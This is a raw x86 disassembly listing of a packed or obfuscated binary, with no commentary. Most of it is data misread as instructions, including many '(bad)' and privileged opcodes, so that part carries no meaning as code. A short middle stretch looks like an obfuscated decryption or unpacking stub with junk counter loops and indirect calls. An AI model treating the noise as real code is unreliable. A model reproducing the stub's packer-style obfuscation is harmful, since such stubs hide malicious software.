  40d8be:	sub    eax,0x224a699a
  40d8c3:	fdiv   DWORD PTR [edi-0x40]
  40d8c6:	icebp  
  40d8c7:	loop   0x40d874
  40d8c9:	xor    eax,0x6f1c784
  40d8ce:	inc    esi
  40d8cf:	out    0x75,al
  40d8d1:	and    al,0x38
  40d8d3:	bound  ebp,QWORD PTR [ecx]
  40d8d5:	mov    dh,BYTE PTR [ebx]
  40d8d7:	push   esi
  40d8d8:	or     edi,esi
  40d8da:	cmp    BYTE PTR [ebx],dh
  40d8dc:	cwde   
  40d8dd:	jb     0x40d920
  40d8df:	xchg   esp,eax
  40d8e0:	loope  0x40d934
  40d8e2:	adc    DWORD PTR [edx-0x77806934],eax
  40d8e8:	jmp    0x5384:0xe8d376b7
  40d8ef:	push   esi
  40d8f0:	es loope 0x40d91c
  40d8f3:	data16 sub BYTE PTR [ebx+0x17],bl
  40d8f7:	sbb    ch,ch
  40d8f9:	pop    eax
  40d8fa:	dec    edx
  40d8fb:	shl    DWORD PTR [ecx+esi*2],0xb5
  40d8ff:	push   esi
  40d900:	and    ebp,DWORD PTR [ebx+0x6d]
  40d903:	cmp    esi,DWORD PTR [edi]
  40d905:	add    bh,BYTE PTR [esi]
  40d907:	stc    
  40d908:	jae    0x40d8ff
  40d90a:	push   ecx
  40d90b:	pop    esp
  40d90c:	sub    BYTE PTR [esi-0x58ea3452],dh
  40d912:	outs   dx,DWORD PTR ds:[esi]
  40d913:	dec    edi
  40d914:	pop    esi
  40d915:	pusha  
  40d916:	fwait
  40d917:	xchg   BYTE PTR [esi+0x845c7dc],al
  40d91d:	daa    
  40d91e:	jb     0x40d8c7
  40d920:	dec    edx
  40d921:	stos   BYTE PTR es:[edi],al
  40d922:	add    eax,0x4382bdb8
  40d927:	sub    DWORD PTR [ebx-0xc213dc0],esp
  40d92d:	int    0x21
  40d92f:	stos   DWORD PTR es:[edi],eax
  40d930:	sbb    cl,ah
  40d932:	xchg   esi,eax
  40d933:	mov    DWORD PTR [ebx+0x67],ecx
  40d936:	xor    esi,edi
  40d938:	ins    DWORD PTR es:[edi],dx
  40d939:	pop    esi
  40d93a:	ds dec esp
  40d93c:	retf   
  40d93d:	nop
  40d93e:	aad    0x95
  40d940:	xor    DWORD PTR [ebp+eax*1-0x25],ecx
  40d944:	cmp    esi,eax
  40d946:	int    0x26
  40d948:	scas   al,BYTE PTR es:[edi]
  40d949:	pop    edi
  40d94a:	sub    esi,DWORD PTR ds:0xec83eb77
  40d950:	pop    ecx
  40d951:	xchg   edi,eax
  40d952:	icebp  
  40d953:	sub    al,BYTE PTR [eax+ebx*8]
  40d956:	cmp    al,0xa1
  40d958:	xor    al,0x68
  40d95a:	pusha  
  40d95b:	pop    ds
  40d95c:	mov    ah,BYTE PTR [ecx+eiz*4+0x1d]
  40d960:	ss push cs
  40d962:	(bad)  
  40d963:	pop    ebp
  40d964:	je     0x40d96c
  40d966:	in     al,0x85
  40d968:	xor    al,BYTE PTR [eax+0x2]
  40d96b:	cdq    
  40d96c:	fsub   QWORD PTR [ecx+0x6]
  40d96f:	int    0xf4
  40d971:	test   eax,0x24b112bd
  40d976:	out    dx,eax
  40d977:	dec    esi
  40d978:	mov    esi,0x506ff411
  40d97d:	adc    edi,0x63fab96b
  40d983:	and    dh,bl
  40d985:	icebp  
  40d986:	cwde   
  40d987:	sbb    eax,0xdc268b37
  40d98c:	das    
  40d98d:	inc    si
  40d98f:	add    ch,BYTE PTR [edx-0x70fd8125]
  40d995:	ret    
  40d996:	sti    
  40d997:	add    bl,BYTE PTR [ebx+0x246e0fea]
  40d99d:	push   edi
  40d99e:	leave  
  40d99f:	xchg   BYTE PTR [ebp+eiz*8-0x6c479ec0],bh
  40d9a6:	sbb    cl,BYTE PTR [edi-0x3a18c1ce]
  40d9ac:	xchg   DWORD PTR [eax+0x353c8afc],esi
  40d9b2:	dec    esp
  40d9b3:	fiadd  WORD PTR [ebx+0x73]
  40d9b6:	ins    DWORD PTR es:[edi],dx
  40d9b7:	lahf   
  40d9b8:	lock (bad) 
  40d9ba:	fsub   DWORD PTR [edx-0x44]
  40d9bd:	or     edx,eax
  40d9bf:	lods   al,BYTE PTR ds:[esi]
  40d9c0:	or     DWORD PTR [edx+0x27],edx
  40d9c3:	fdiv   DWORD PTR [ecx-0x5e]
  40d9c6:	div    BYTE PTR [eax-0x395a3491]
  40d9cc:	js     0x40d9b4
  40d9ce:	test   edi,eax
  40d9d0:	hlt    
  40d9d1:	je     0x40d9cf
  40d9d3:	dec    eax
  40d9d4:	mov    bh,0x9d
  40d9d6:	adc    edi,DWORD PTR [ecx]
  40d9d8:	cmc    
  40d9d9:	and    esp,eax
  40d9db:	iret   
  40d9dc:	pushf  
  40d9dd:	xchg   esp,eax
  40d9de:	popa   
  40d9df:	pop    ebp
  40d9e0:	xchg   esp,eax
  40d9e1:	xor    ebx,DWORD PTR [edx]
  40d9e3:	mov    DWORD PTR [eax],esi
  40d9e5:	and    BYTE PTR [ebx],bl
  40d9e7:	hlt    
  40d9e8:	sbb    al,0x1e
  40d9ea:	pusha  
  40d9eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ec:	hlt    
  40d9ed:	jmp    0x5412:0x6c1b5e8b
  40d9f4:	loopne 0x40d9e7
  40d9f6:	test   BYTE PTR [ebp+ecx*2+0x9f26d4],dh
  40d9fd:	nop
  40d9fe:	xchg   edx,eax
  40d9ff:	and    eax,0x2181c042
  40da04:	(bad)  
  40da05:	dec    edx
  40da06:	fsubr  st(2),st
  40da08:	jbe    0x40da84
  40da0a:	aam    0x7b
  40da0c:	push   esp
  40da0d:	pop    eax
  40da0e:	or     al,0xc6
  40da10:	inc    edx
  40da11:	clc    
  40da12:	ror    eax,1
  40da14:	stc    
  40da15:	push   ecx
  40da16:	(bad)  
  40da17:	cmc    
  40da18:	addr16 pusha 
  40da1a:	ds stos DWORD PTR es:[edi],eax
  40da1c:	jl     0x40da75
  40da1e:	pop    ss
  40da1f:	jge    0x40da3e
  40da21:	test   DWORD PTR [esi-0xb1d7911],esp
  40da27:	xchg   edi,eax
  40da28:	or     eax,DWORD PTR [edi]
  40da2a:	cmp    al,0x36
  40da2c:	lea    edx,[eax-0x5fd4ff7f]
  40da32:	lods   eax,DWORD PTR ds:[esi]
  40da33:	repnz sti 
  40da35:	mov    bl,0x6f
  40da37:	sub    al,0xdd
  40da39:	sbb    BYTE PTR [esi+0x4a378790],al
  40da3f:	mov    esi,0x3b34dd3c
  40da44:	mov    al,0x11
  40da46:	ins    BYTE PTR es:[edi],dx
  40da47:	pushf  
  40da48:	pop    eax
  40da49:	cmp    al,0xc2
  40da4b:	pop    esi
  40da4c:	icebp  
  40da4d:	sub    DWORD PTR [ecx],eax
  40da4f:	arpl   WORD PTR [edx+0x46c7e665],bp
  40da55:	(bad)  
  40da56:	aam    0xa6
  40da58:	mov    esp,0x47cd1f8
  40da5d:	cdq    
  40da5e:	mov    ebx,0x150325e4
  40da63:	lods   eax,DWORD PTR ds:[esi]
  40da64:	pop    es
  40da65:	aam    0xc2
  40da67:	adc    edx,DWORD PTR ds:0xec419723
  40da6d:	inc    esp
  40da6e:	jmp    0x27741823
  40da73:	ror    BYTE PTR [ebx+0x1],cl
  40da76:	jns    0x40da17
  40da78:	hlt    
  40da79:	jb     0x40dab9
  40da7b:	rol    al,cl
  40da7d:	mov    edi,0xfc4f0f30
  40da82:	adc    al,BYTE PTR [edx-0x18a12934]
  40da88:	mov    ecx,gs
  40da8a:	dec    ebp
  40da8b:	cmc    
  40da8c:	jp     0x40daaf
  40da8e:	and    BYTE PTR [edi],bl
  40da90:	push   edx
  40da91:	sti    
  40da92:	sub    ch,ch
  40da94:	aaa    
  40da95:	jg     0x40da7b
  40da97:	pop    esi
  40da98:	jno    0x40dae4
  40da9a:	xchg   esp,eax
  40da9b:	jmp    0x40dab0
  40da9d:	add    DWORD PTR [ecx+0x4328036d],ebx
  40daa3:	scas   al,BYTE PTR es:[edi]
  40daa4:	sti    
  40daa5:	push   ebx
  40daa6:	mov    dh,0x4f
  40daa8:	or     eax,0x8f61de4d
  40daad:	std    
  40daae:	imul   ebp,DWORD PTR [ebx],0x19
  40dab1:	adc    ch,BYTE PTR [edx]
  40dab3:	mov    ds:0x3ccf06ee,eax
  40dab8:	jns    0x40dace
  40daba:	and    ebp,0xffffffa7
  40dabd:	cmp    DWORD PTR [ebx],esi
  40dabf:	cmp    al,0xd4
  40dac1:	daa    
  40dac2:	ret    0xf59b
  40dac5:	adc    ch,bh
  40dac7:	push   ecx
  40dac8:	repz push eax
  40daca:	ins    BYTE PTR es:[edi],dx
  40dacb:	xchg   ecx,eax
  40dacc:	pop    edx
  40dacd:	mov    edi,DWORD PTR [ecx+0x16]
  40dad0:	(bad)  
  40dad1:	pop    edx
  40dad2:	mov    esi,0x42de423f
  40dad7:	in     al,dx
  40dad8:	cwde   
  40dad9:	sti    
  40dada:	jnp    0x40db4a
  40dadc:	out    dx,al
  40dadd:	ficom  DWORD PTR [esi+0xc]
  40dae0:	adc    DWORD PTR [edx],ecx
  40dae2:	clc    
  40dae3:	(bad)
  40dae7:	lock jo 0x40da8b
  40daea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daeb:	fwait
  40daec:	cmc    
  40daed:	ficomp WORD PTR [edx]
  40daef:	jge    0x40daf3
  40daf1:	test   al,0xff
  40daf3:	(bad)  
  40daf4:	fnstenv [ebx+0x71bcf4b3]
  40dafa:	int    0xf6
  40dafc:	adc    bh,BYTE PTR [ebx+0x35d0e8b]
  40db02:	pop    ecx
  40db03:	stos   DWORD PTR es:[edi],eax
  40db04:	in     al,dx
  40db05:	mov    edi,0xe1580c7a
  40db0a:	fwait
  40db0b:	adc    eax,0xfec3e7ed
  40db10:	cwde   
  40db11:	sti    
  40db12:	cmp    BYTE PTR [ebp+0x4f841b60],al
  40db18:	repnz or bh,BYTE PTR [eax+0x422740c6]
  40db1f:	or     edi,ecx
  40db21:	sbb    edx,DWORD PTR [edx]
  40db23:	call   0x568c:0x6e3cb27a
  40db2a:	adc    DWORD PTR [ebx-0x7c],ecx
  40db2d:	sahf   
  40db2e:	pop    edi
  40db2f:	sub    ebx,DWORD PTR [eax+0x6f]
  40db32:	test   DWORD PTR [esi+0x355061f6],ebx
  40db38:	xchg   edi,eax
  40db39:	pushf  
  40db3a:	arpl   WORD PTR [ebx],bx
  40db3c:	sbb    BYTE PTR [ebx],al
  40db3e:	sbb    eax,DWORD PTR [ebp+eiz*1+0x61]
  40db42:	rcl    BYTE PTR [edx-0x30690f71],1
  40db48:	mov    gs,WORD PTR [esi+0x24]
  40db4b:	repz scas al,BYTE PTR es:[edi]
  40db4d:	sbb    edx,edx
  40db4f:	push   0x67
  40db51:	cmp    al,0x53
  40db53:	test   al,0xb7
  40db55:	stc    
  40db56:	fidivr WORD PTR [edi-0x5a]
  40db59:	mov    ah,0xd4
  40db5b:	xor    DWORD PTR [eax-0x3f96a6f6],0x7e4d1848
  40db65:	fwait
  40db66:	cmp    DWORD PTR [eax-0x7c],edx
  40db69:	les    esp,FWORD PTR [edi-0x205ce18]
  40db6f:	test   DWORD PTR [edi+0x56],esi
  40db72:	xchg   esi,eax
  40db73:	stos   DWORD PTR es:[edi],eax
  40db74:	ficom  WORD PTR [edi+0x1f2cdfb3]
  40db7a:	sbb    DWORD PTR [edi],0x66
  40db7d:	leave  
  40db7e:	lock xor DWORD PTR [eax+0x3b66a6e3],ecx
  40db85:	ffree  st(4)
  40db87:	scas   al,BYTE PTR es:[di]
  40db89:	sar    dl,0x5d
  40db8c:	inc    edi
  40db8d:	push   cs
  40db8e:	push   ss
  40db8f:	(bad)  
  40db90:	jmp    0x2044408c
  40db95:	aam    0xf5
  40db97:	mov    ah,0x89
  40db99:	mov    edi,0x5dbe1aec
  40db9e:	and    BYTE PTR [edx+0x39],ah
  40dba1:	mov    ecx,0x8875bb2d
  40dba6:	push   ss
  40dba7:	cld    
  40dba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba9:	mov    BYTE PTR [esi],dl
  40dbab:	les    eax,FWORD PTR [edi-0xc710861]
  40dbb1:	add    DWORD PTR ds:0x7e1214b0,edx
  40dbb7:	inc    ebp
  40dbb8:	sahf   
  40dbb9:	imul   DWORD PTR [ebp+eax*8-0x27419e8e]
  40dbc0:	data16 arpl WORD PTR [ecx+0x295e956d],bx
  40dbc7:	jmp    0x40dbb6
  40dbc9:	icebp  
  40dbca:	mov    bh,bl
  40dbcc:	inc    esi
  40dbcd:	in     eax,dx
  40dbce:	inc    ecx
  40dbcf:	sahf   
  40dbd0:	inc    ebx
  40dbd1:	mul    ebx
  40dbd3:	cmp    BYTE PTR [edx+0x24],0x5b
  40dbd7:	mov    esi,0xafe6e29e
  40dbdc:	dec    esp
  40dbdd:	gs popf 
  40dbdf:	repnz les ebx,FWORD PTR [ebx+0x7e4ee6e3]
  40dbe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe7:	fnstsw WORD PTR [edx]
  40dbe9:	int3   
  40dbea:	daa    
  40dbeb:	lods   al,BYTE PTR ds:[esi]
  40dbec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbed:	std    
  40dbee:	int    0x6b
  40dbf0:	push   esi
  40dbf1:	es push esp
  40dbf3:	int    0xd6
  40dbf5:	push   edx
  40dbf6:	xor    DWORD PTR [eax-0x46eb9549],esi
  40dbfc:	push   edi
  40dbfd:	std    
  40dbfe:	lahf   
  40dbff:	jmp    FWORD PTR [ecx+0x14]
  40dc02:	mov    eax,0xb15c603
  40dc07:	mov    dl,0x37
  40dc09:	push   esp
  40dc0a:	inc    ebx
  40dc0b:	mov    ah,0x6a
  40dc0d:	out    dx,eax
  40dc0e:	mov    ds:0xd2ce24d7,eax
  40dc13:	repz xor DWORD PTR [edi+0x71],edx
  40dc17:	and    eax,0x31e4a08
  40dc1c:	sbb    ebp,ebp
  40dc1e:	adc    al,0xa6
  40dc20:	(bad)  
  40dc21:	fild   QWORD PTR cs:[esi+ecx*8]
  40dc25:	dec    ebp
  40dc26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc27:	sub    eax,0xa40a240e
  40dc2c:	scas   al,BYTE PTR es:[edi]
  40dc2d:	xor    BYTE PTR [edx+ecx*1-0x4a143833],0x9d
  40dc35:	adc    al,BYTE PTR [edi-0xd0fcc73]
  40dc3b:	test   BYTE PTR [edx],dl
  40dc3d:	dec    esi
  40dc3e:	jmp    0x40dc2a
  40dc40:	stos   BYTE PTR es:[edi],al
  40dc41:	ret    
  40dc42:	cs mov edi,DWORD PTR cs:[ebx+0x1f]
  40dc47:	push   0x54
  40dc49:	mov    ?,WORD PTR [ebx-0x328249bf]
  40dc4f:	jns    0x40dc07
  40dc51:	mov    ch,0x5d
  40dc53:	jmp    0xe9fb:0x6055bd3c
  40dc5a:	and    DWORD PTR [ecx],0xa26af446
  40dc60:	jmp    0x40dc6f
  40dc62:	lea    ebp,es:[eax-0x445869a3]
  40dc69:	ficomp DWORD PTR [edi+edi*8-0x47cd00ad]
  40dc70:	adc    DWORD PTR [ebx+0xe],esi
  40dc73:	das    
  40dc74:	imul   eax,DWORD PTR [esi+0x42651631],0xef10aec
  40dc7e:	pop    edi
  40dc7f:	sub    BYTE PTR [ebx+ebx*4-0x65],ch
  40dc83:	test   BYTE PTR [ebx-0x73],cl
  40dc86:	pop    es
  40dc87:	dec    ecx
  40dc88:	outs   dx,DWORD PTR ds:[esi]
  40dc89:	adc    ch,BYTE PTR ds:0x1f44
  40dc8e:	or     eax,0xdfb3e06d
  40dc93:	mov    ebx,0x302799c8
  40dc98:	shl    BYTE PTR [edx+0x15],0x73
  40dc9c:	mov    DWORD PTR ds:0x219e5d03,esp
  40dca2:	mov    edi,0xbdc4d628
  40dca7:	jp     0x40dc3a
  40dca9:	test   BYTE PTR [edi],0x92
  40dcac:	jne    0x40dd09
  40dcae:	popf   
  40dcaf:	mov    ebp,0x9bd4210c
  40dcb4:	out    dx,eax
  40dcb5:	jne    0x40dcbc
  40dcb7:	dec    ax
  40dcb9:	imul   ebp,DWORD PTR [esi+0x29f2f208],0xc986d618
  40dcc3:	aad    0x19
  40dcc5:	in     eax,0x6d
  40dcc7:	adc    ch,dh
  40dcc9:	push   esp
  40dcca:	inc    eax
  40dccb:	add    DWORD PTR [esi+edi*2],0xfffffff0
  40dccf:	xlat   BYTE PTR ds:[ebx]
  40dcd0:	jecxz  0x40dca4
  40dcd2:	add    edi,0xbb550e38
  40dcd8:	aaa    
  40dcd9:	xchg   DWORD PTR [edi+ecx*4-0x29],edi
  40dcdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcde:	mov    cs,WORD PTR [esi]
  40dce0:	add    bh,al
  40dce2:	pop    esp
  40dce3:	ss adc eax,0xe1e7e8a1
  40dce9:	pop    bp
  40dceb:	ins    BYTE PTR es:[edi],dx
  40dcec:	pushf  
  40dced:	xchg   DWORD PTR [ebp+0x29a74efd],esi
  40dcf3:	or     BYTE PTR [esi+edx*2+0x2fed57cb],ch
  40dcfa:	sub    esi,ebx
  40dcfc:	rcl    DWORD PTR [ecx+ebx*8-0x465b80cd],cl
  40dd03:	push   ds
  40dd04:	mov    ah,0xbd
  40dd06:	(bad)
  40dd09:	sub    esp,esp
  40dd0b:	xchg   DWORD PTR ds:0x657888af,ecx
  40dd11:	mov    ch,0x5b
  40dd13:	push   esi
  40dd14:	mov    edi,0x5a99c2ec
  40dd19:	xor    ecx,esi
  40dd1b:	add    DWORD PTR ds:0x42a018,0x42a000
  40dd25:	mov    DWORD PTR [ebp-0x34],eax
  40dd28:	add    ecx,edi
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42364e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	fidiv  WORD PTR [eax]
  40deda:	sub    al,0x33
  40dedc:	pop    ss
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	bound  esi,QWORD PTR [edx]
  40dee5:	loopne 0x40deb4
  40dee7:	clc    
  40dee8:	sub    ebp,DWORD PTR [ebx+0x6c58564c]
  40deee:	xor    al,BYTE PTR [edi-0x28]
  40def1:	mov    dl,0xc2
  40def3:	cwde   
  40def4:	adc    DWORD PTR [ecx],edi
  40def6:	push   eax
  40def7:	stos   DWORD PTR es:[edi],eax
  40def8:	mov    esi,0x3644bde
  40defd:	mov    ds:0xce10d7d8,eax
  40df02:	jbe    0x40def4
  40df04:	ret    
  40df05:	xchg   esp,eax
  40df06:	inc    esi
  40df07:	mov    DWORD PTR [eax-0x7a],ebp
  40df0a:	mov    esi,0xc89b60ce
  40df0f:	pop    eax
  40df10:	xchg   esp,eax
  40df11:	test   DWORD PTR [eax],edx
  40df13:	mov    dl,0x8c
  40df15:	imul   edx,DWORD PTR [esi+0x7d0d422d],0xf6a9c921
  40df1f:	xchg   ecx,eax
  40df20:	or     dh,BYTE PTR [ebp+0x35]
  40df23:	inc    ecx
  40df24:	fwait
  40df25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df26:	mov    dh,bh
  40df28:	mov    ch,0x89
  40df2a:	fild   DWORD PTR [ebp+ecx*4+0x37]
  40df2e:	pop    ebp
  40df2f:	jmp    0x40dedc
  40df31:	dec    ecx
  40df32:	xlat   BYTE PTR ds:[ebx]
  40df33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df34:	div    DWORD PTR [edi+0x97549bc]
  40df3a:	neg    DWORD PTR [ebp+0x4cb4c1e4]
  40df40:	pusha  
  40df41:	cld    
  40df42:	jae    0x40df8d
  40df44:	out    dx,eax
  40df45:	jmp    0xce1:0xdb8e44d4
  40df4c:	add    eax,0xf390daf5
  40df51:	and    bl,cl
  40df53:	pop    edi
  40df54:	jl     0x40df5c
  40df56:	mov    ecx,0xaad43f62
  40df5b:	icebp  
  40df5c:	mov    ah,0x46
  40df5e:	test   BYTE PTR [edx+0x61],bh
  40df61:	mov    ebx,0x6677236b
  40df66:	in     eax,0x44
  40df68:	jb     0x40df14
  40df6a:	push   esp
  40df6b:	out    0x53,eax
  40df6d:	rcr    BYTE PTR [edi+ecx*1],cl
  40df70:	in     al,dx
  40df71:	(bad)  [ecx+0x54]
  40df74:	push   edx
  40df75:	arpl   WORD PTR [edi-0x256fbd53],bp
  40df7b:	repz adc eax,0x85037ce4
  40df81:	or     al,0x2b
  40df83:	inc    esi
  40df84:	loopne 0x40df65
  40df86:	imul   cx,WORD PTR [edx-0x4465b8ac],0xd0a4
  40df8f:	push   ds
  40df90:	sbb    eax,0xf322928c
  40df95:	and    BYTE PTR [eax],ah
  40df97:	and    ecx,edi
  40df99:	sub    al,0x7e
  40df9b:	cmp    eax,0x7ad90c9c
  40dfa0:	dec    esp
  40dfa1:	lahf   
  40dfa2:	scas   al,BYTE PTR es:[edi]
  40dfa3:	ficomp DWORD PTR [ebx-0x3c263b0]
  40dfa9:	in     eax,0x9
  40dfab:	or     BYTE PTR [edx+0x63],cl
  40dfae:	mov    ah,0xe
  40dfb0:	ja     0x40df9e
  40dfb2:	mov    bl,0x6c
  40dfb4:	rcl    BYTE PTR [esi],cl
  40dfb6:	into   
  40dfb7:	jne    0x40dff1
  40dfb9:	jp     0x40df3b
  40dfbb:	cmp    ebx,DWORD PTR [ecx]
  40dfbd:	add    eax,0x6e855745
  40dfc2:	cmp    eax,0x4cde1620
  40dfc7:	cmp    eax,0x66e4c0c2
  40dfcc:	mul    ebx
  40dfce:	jecxz  0x40df81
  40dfd0:	in     al,dx
  40dfd1:	out    dx,eax
  40dfd2:	imul   edi,ebp,0xffffffc0
  40dfd5:	xchg   edi,esi
  40dfd7:	stos   DWORD PTR es:[edi],eax
  40dfd8:	sbb    ebx,DWORD PTR [ebx-0x39]
  40dfdb:	xchg   BYTE PTR [eax+0x7bf31ab],bl
  40dfe1:	push   edi
  40dfe2:	test   BYTE PTR [edi],bl
  40dfe4:	lea    esi,[ecx+edx*8]
  40dfe7:	test   DWORD PTR [ecx-0x46f33425],esi
  40dfed:	push   eax
  40dfee:	ficom  DWORD PTR [esp+edi*1]
  40dff1:	inc    ebx
  40dff2:	sbb    esp,DWORD PTR [ebx+edx*4-0x5623f8f1]
  40dff9:	push   ss
  40dffa:	lock jne 0x40e040
  40dffd:	mov    BYTE PTR [edi],bh
  40dfff:	or     esp,esp
  40e001:	sub    DWORD PTR [edx],0xffffff98
  40e004:	adc    BYTE PTR ds:0x2f61cef4,ah
  40e00a:	pop    edx
  40e00b:	sub    eax,0xdf692f4e
  40e010:	add    ebp,edx
  40e012:	popf   
  40e013:	and    BYTE PTR [edi-0x3e4aa064],ch
  40e019:	mov    esi,cr3
  40e01c:	addr16 inc esi
  40e01e:	shr    ebx,1
  40e020:	or     bl,BYTE PTR [eax]
  40e022:	adc    al,0x9e
  40e024:	mov    ah,0x56
  40e026:	and    DWORD PTR [edx-0x49],ebx
  40e029:	mov    ch,0xd8
  40e02b:	call   0xaeb7d2d0
  40e030:	int3   
  40e031:	jg     0x40dfdb
  40e033:	in     al,0x74
  40e035:	inc    edi
  40e036:	jge    0x40dfe1
  40e038:	icebp  
  40e039:	xlat   BYTE PTR ds:[ebx]
  40e03a:	loop   0x40e018
  40e03c:	fcmove st,st(4)
  40e03e:	sbb    eax,0x18e21706
  40e043:	cmp    edi,DWORD PTR [edx-0x5e]
  40e046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e047:	test   al,0x5a
  40e049:	(bad)  
  40e04a:	cld    
  40e04b:	xchg   ecx,eax
  40e04c:	retf   0x7e0e
  40e04f:	adc    ebx,DWORD PTR [ebx+0x63]
  40e052:	outs   dx,BYTE PTR ds:[esi]
  40e053:	popa   
  40e054:	cmc    
  40e055:	cmp    ecx,DWORD PTR [edx]
  40e057:	test   BYTE PTR [ebx+edx*4-0x2f072a89],ch
  40e05e:	pop    es
  40e05f:	ins    BYTE PTR es:[edi],dx
  40e060:	mov    WORD PTR [edi-0x7e],ss
  40e063:	ds mov edi,0x632c3abd
  40e069:	and    BYTE PTR ds:0x5735ebdc,al
  40e06f:	xchg   al,dl
  40e071:	mov    DWORD PTR [edi+esi*2+0x18d54b94],esp
  40e078:	xor    ebp,DWORD PTR [ebp+ebx*4-0x2096278b]
  40e07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e080:	sub    bh,BYTE PTR [esi+0x1a4643f7]
  40e086:	je     0x40e058
  40e088:	push   esi
  40e089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e08a:	xchg   edx,eax
  40e08b:	ds into 
  40e08d:	add    dl,BYTE PTR [edi+ecx*4]
  40e090:	retf   
  40e091:	pop    cx
  40e093:	cdq    
  40e094:	mov    cl,0x46
  40e096:	aam    0x83
  40e098:	mov    eax,0x8623cb42
  40e09d:	popf   
  40e09e:	clc    
  40e09f:	repnz mov bh,0xb3
  40e0a2:	sbb    cl,BYTE PTR ds:0xc1b17540
  40e0a8:	jb     0x40e0dd
  40e0aa:	adc    al,0x7e
  40e0ac:	push   cs
  40e0ad:	es cmp eax,ebx
  40e0b0:	fcmovbe st,st(6)
  40e0b2:	repnz push ss
  40e0b4:	test   cl,0xfd
